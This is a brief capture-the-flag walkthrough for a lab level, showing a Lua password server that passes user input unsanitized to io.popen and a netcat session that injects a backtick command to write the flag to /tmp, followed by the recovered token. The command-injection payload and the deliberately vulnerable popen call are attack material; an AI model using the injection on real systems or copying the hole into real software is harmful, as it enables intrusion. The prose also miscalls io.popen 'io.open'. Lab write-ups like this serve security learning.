# We have a lua script 
```bash
cat level11.lua
```

```lua
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end

  end

  client:close()
end
```

- This script open a connection and wait for a assword to compare with the one who is hashed. The script use 'io.open' function for the hash function.
io.open function is used here to exec a cmd. 

# Test the connection 
```bash
nc localhost 5151
password: 
```

- Waiting for a password

- We can inject cmd to execute
```bash
password: `getflag` > /tmp/token11
```

- cat /tmp/token11

- Token = fa6v5ateaw21peobuub8ipe6s
